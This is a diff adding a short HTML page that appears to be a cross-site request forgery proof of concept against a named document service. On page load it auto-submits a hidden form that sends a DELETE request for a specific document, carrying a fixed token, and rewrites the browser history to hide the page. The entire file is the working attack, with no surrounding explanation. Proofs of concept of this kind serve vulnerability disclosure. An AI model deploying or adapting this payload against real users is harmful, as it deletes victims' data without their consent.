@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <form action="https://docs.superhuman.com/internalAppApi/documents/fTCah3NZVq" method="POST">
+      <input type="hidden" name="_method" value="DELETE">
+      <input type="hidden" name="csrf_token" value="C6kuHuDc8dA4CJU9">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
